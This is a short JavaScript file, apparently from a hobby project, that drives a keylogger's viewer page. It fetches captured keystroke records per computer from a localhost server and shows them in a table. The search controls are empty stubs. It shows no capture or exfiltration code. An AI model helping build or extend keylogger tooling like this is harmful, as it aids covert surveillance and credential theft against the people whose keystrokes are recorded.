/**
 * Author: Keven McDowell
 * Browser script for the keylogger page that displays all the keystroke information.
 */

"use strict";

// Small module I wrote inside the script.
const windowFuncs = {
    // Function for grabbing all of the keystroke data from the server and building a table on the page
    // with it.
    getAllStrokes: () => {
      fetch("http://localhost:8080/getAllKeys")
        .then(resp => resp.text())
        .then(text => JSON.parse(text))
        .then(keystrokes => {
          keystrokes.forEach(entry => {
            const dataTableBody = document.querySelector("tbody"),
              newRow = document.createElement("tr"),
              newComputer = document.createElement("td"),
              newKeyStrokes = document.createElement("td"),
              newTimestamp = document.createElement("td"),
              computerText = document.createTextNode(entry.computerName),
              keyStrokeText = document.createTextNode(entry.keystrokes),
              timeStampText = document.createTextNode(entry.timestamp);

            newComputer.appendChild(computerText);
            newKeyStrokes.appendChild(keyStrokeText);
            newTimestamp.appendChild(timeStampText);

            newRow.appendChild(newComputer);
            newRow.appendChild(newKeyStrokes);
            newRow.appendChild(newTimestamp);

            dataTableBody.appendChild(newRow);
          });
        }).catch(e => {
            throw new Error(e);
        });
    }
  };



(() => {
  // Code executed when the page finishes loading the DOMContent.
  window.addEventListener(
    "DOMContentLoaded",
    e => {
        const submitButton = document.querySelector("#submitBtn"),
        searchInput = document.querySelector("#searchInput"),
        dataTable = document.querySelector("#dataTable");

      // Event listener to query the database on the server when clicked.
      submitButton.addEventListener("click", e => {
        e.preventDefault();
      });

      // Event listener for the input that the computer name is entered into.
      searchInput.addEventListener("input", e => {
        e.preventDefault();
      });

      // Populates the data on the page on load.
      windowFuncs.getAllStrokes();
    },
    false
  );
})();
